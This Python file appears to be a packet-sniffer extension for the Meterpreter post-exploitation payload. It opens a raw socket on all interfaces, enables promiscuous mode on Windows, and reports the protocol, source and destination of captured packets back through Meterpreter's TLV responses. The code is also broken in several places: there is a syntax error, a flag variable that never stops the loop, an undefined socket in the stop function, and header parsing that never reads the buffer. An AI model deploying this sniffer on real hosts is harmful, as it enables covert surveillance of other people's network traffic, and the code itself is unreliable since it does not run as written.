import os
import struct
import socket
from ctypes import *
import psutil

flag = True
host = "0.0.0.0" # this should be fixed as it should listen to specific interface and not all interfaces

class IP(Structure):
  _fields_ = [
  ("ihl", c_ubyte, 4),
  ("version", c_ubyte, 4),
  ("tos", c_ubyte),
  ("len", c_ushort),
  ("id", c_ushort),
  ("offset", c_ushort),
  ("ttl", c_ubyte),
  ("protocol_num", c_ubyte),
  ("sum", c_ushort),
  ("src", c_ulong),
  ("dst", c_ulong)
  ]

  def __init__(self, socket_buffer=None):
    self.protocol_map = {1:"ICMP", 6:"TCP", 17:"UDP"}
    self.src_address = socket.inet_ntoa(struct.pack("<L",self.src))
    self.dst_address = socket.inet_ntoa(struct.pack("<L",self.dst))
    self.protocol = self.protocol_map[self.protocol_num]



def request_sniffer_capture_start(request, response):
    sniffer_data []
    socket_protocol = socket.IPPROTO_IP
    sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol)
    sniffer.bind((host, 0))
    sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) # turning on promiscous mode for windows

    while flag:
      raw_buffer = sniffer.recvfrom(65565)[0]
      ip_header = IP(raw_buffer[0:20])
      response += tlv_pack(TLV_TYPE_STRING, ip_header.protocol) + tlv_pack(TLV_TYPE_STRING, ip_header.src_address) + tlv_pack(TLV_TYPE_STRING, ip_header.dst_address)
    return response



def request_sniffer_capture_stop(request, response):
    flag = False
    sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) # turning of the promiscous mode in case of windows

def request_sniffer_interfaces(request, response):
  addrs = psutil.net_if_addrs()
  response = tlv_pack(TLV_TYPE_SNIFFER_INTERFACES, addrs.keys())
  return ERROR_SUCCESS, response

meterpreter.register_extension('sniffer')
